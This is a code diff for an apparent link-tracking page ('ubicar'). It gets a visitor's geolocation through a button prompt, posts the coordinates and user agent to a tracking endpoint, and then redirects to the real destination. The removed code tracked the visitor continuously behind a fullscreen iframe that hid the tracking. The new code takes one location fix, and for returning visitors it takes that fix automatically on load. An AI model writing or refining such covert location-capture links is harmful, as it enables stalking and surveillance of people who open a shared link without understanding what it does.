@@ -277,17 +277,8 @@ app.get('/s/:id', async (req, res) => {
         var storageKey = 'ubicar_subscribed_' + linkId;
         var destUrl = '${destinationUrl}';
         var alreadySubscribed = localStorage.getItem(storageKey);
-        var lastLat = null, lastLng = null;
-        var THRESHOLD = 10; // meters
 
-        // Haversine distance in meters
-        function distanceM(lat1, lng1, lat2, lng2) {
-            var R = 6371000, dLat = (lat2-lat1)*Math.PI/180, dLng = (lng2-lng1)*Math.PI/180;
-            var a = Math.sin(dLat/2)*Math.sin(dLat/2) + Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLng/2)*Math.sin(dLng/2);
-            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-        }
-
-        // Send location via sendBeacon (reliable, survives page changes)
+        // Send location via sendBeacon (survives page navigation)
         function sendLocation(lat, lng) {
             var data = JSON.stringify({ linkId: linkId, lat: lat, lng: lng, userAgent: navigator.userAgent });
             if (navigator.sendBeacon) {
@@ -295,31 +286,35 @@ app.get('/s/:id', async (req, res) => {
             } else {
                 fetch('/api/track', { method:'POST', headers:{'Content-Type':'application/json'}, body:data, keepalive:true }).catch(function(){});
             }
-            lastLat = lat; lastLng = lng;
         }
 
-        // Show destination in fullscreen iframe + start continuous tracking
-        function showDestAndTrack() {
-            // Replace page with iframe
-            document.body.innerHTML = '<div style="position:fixed;inset:0;z-index:9999;background:#000"><div style="height:2px;background:#3b82f6;width:100%;animation:pulse 2s infinite"></div><iframe src="' + destUrl + '" style="width:100%;height:calc(100% - 2px);border:none" allow="autoplay;fullscreen"></iframe></div><style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}</style>';
+        // Redirect to destination URL
+        function goToDestination() {
+            window.location.href = destUrl;
+        }
 
-            // Start continuous tracking - only send when moved > 10m
+        // Get location, send it, then redirect
+        function trackAndGo() {
             if (navigator.geolocation) {
-                navigator.geolocation.watchPosition(function(pos) {
-                    var lat = pos.coords.latitude, lng = pos.coords.longitude;
-                    if (lastLat === null || distanceM(lastLat, lastLng, lat, lng) >= THRESHOLD) {
-                        sendLocation(lat, lng);
-                    }
-                }, function(){}, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 });
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        sendLocation(pos.coords.latitude, pos.coords.longitude);
+                        setTimeout(goToDestination, 200);
+                    },
+                    function() { goToDestination(); },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            } else {
+                goToDestination();
             }
         }
 
-        // FLOW: Already subscribed -> show destination immediately + track
+        // Already subscribed: capture fresh location + redirect immediately
         if (alreadySubscribed) {
-            showDestAndTrack();
+            trackAndGo();
         }
 
-        // FLOW: First time -> click CTA -> ask permission -> show destination + track
+        // First time: CTA click -> ask location permission -> send location -> redirect
         document.getElementById('ctaBtn').addEventListener('click', function() {
             var btn = this;
             btn.disabled = true;
@@ -327,7 +322,7 @@ app.get('/s/:id', async (req, res) => {
 
             if (!navigator.geolocation) {
                 localStorage.setItem(storageKey, 'true');
-                showDestAndTrack();
+                goToDestination();
                 return;
             }
 
@@ -337,11 +332,12 @@ app.get('/s/:id', async (req, res) => {
                 function(pos) {
                     sendLocation(pos.coords.latitude, pos.coords.longitude);
                     localStorage.setItem(storageKey, 'true');
-                    showDestAndTrack();
+                    setTimeout(goToDestination, 200);
                 },
                 function() {
+                    // Permission denied or error: still redirect
                     localStorage.setItem(storageKey, 'true');
-                    showDestAndTrack();
+                    goToDestination();
                 },
                 { timeout: 10000, enableHighAccuracy: true }
             );
